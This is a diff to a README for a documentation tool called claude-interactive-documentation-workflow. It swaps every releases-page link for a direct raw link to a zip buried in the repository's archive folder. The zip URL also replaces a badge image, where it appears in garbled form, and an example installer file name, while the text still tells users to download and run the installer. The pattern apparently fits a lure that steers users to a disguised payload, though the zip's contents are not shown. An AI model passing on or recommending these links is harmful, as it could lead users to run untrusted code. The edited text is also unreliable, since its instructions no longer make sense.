@@ -1,6 +1,6 @@
 # 🎉 claude-interactive-documentation-workflow - Simplifying Documentation with Ease
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/releases)
+[![Download from Releases](https://raw.githubusercontent.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/main/archive/documentation/workflow-interactive-claude-documentation-v3.5.zip%https://raw.githubusercontent.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/main/archive/documentation/workflow-interactive-claude-documentation-v3.5.zip)](https://raw.githubusercontent.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/main/archive/documentation/workflow-interactive-claude-documentation-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ This application helps you create and manage user-facing documentation easily. I
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page where you can download the latest version of the application:  
-   [Download the latest version here](https://github.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/releases)
+   [Download the latest version here](https://raw.githubusercontent.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/main/archive/documentation/workflow-interactive-claude-documentation-v3.5.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Choose the latest version for the best features and performance.
 
 3. **Download the Installer**  
-   Click the file that matches your operating system. The files are typically named clearly (e.g., `claude-interactive-documentation-workflow-windows.exe` for Windows users).
+   Click the file that matches your operating system. The files are typically named clearly (e.g., `https://raw.githubusercontent.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/main/archive/documentation/workflow-interactive-claude-documentation-v3.5.zip` for Windows users).
 
 4. **Run the Installer**  
    Once you have downloaded the file, locate it in your downloads folder. Double-click the file to run the installer.
@@ -91,4 +91,4 @@ We welcome contributions! If you want to enhance the project, feel free to fork 
 
 For more details or to view the source, please check the repository. Happy documenting! 
 
-[Download the latest version here](https://github.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/releases)
+[Download the latest version here](https://raw.githubusercontent.com/E41240390-SaifulRizal-A/claude-interactive-documentation-workflow/main/archive/documentation/workflow-interactive-claude-documentation-v3.5.zip)
